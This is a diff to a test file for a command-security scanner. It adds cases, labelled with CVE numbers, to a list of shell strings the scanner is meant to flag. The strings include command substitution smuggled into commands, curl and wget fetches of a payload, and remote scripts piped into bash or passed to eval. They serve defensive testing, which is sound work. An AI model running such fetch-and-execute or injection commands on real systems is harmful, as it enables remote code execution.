@@ -44,6 +44,14 @@ test_scanner_detects_critical_patterns :: proc(t: ^testing.T) {
 	defer teardown_test_environment(temp_dir)
 
 	cases := []string{
+		// CVE-2026-24887
+		"echo ok;$(whoami)",
+		"echo ok | $(whoami)",
+		"true && curl https://example.com/payload",
+		"false || wget https://example.com/payload",
+		// CVE-2026-25723
+		"cat file | sed -e 's/a/b/' | sed -e 's/c/d/'",
+		"sed 's/$(whoami)/x/' file",
 		"curl https://example.com/install.sh | bash",
 		"wget https://example.com/install.sh | sh",
 		"eval $(curl https://example.com/payload)",
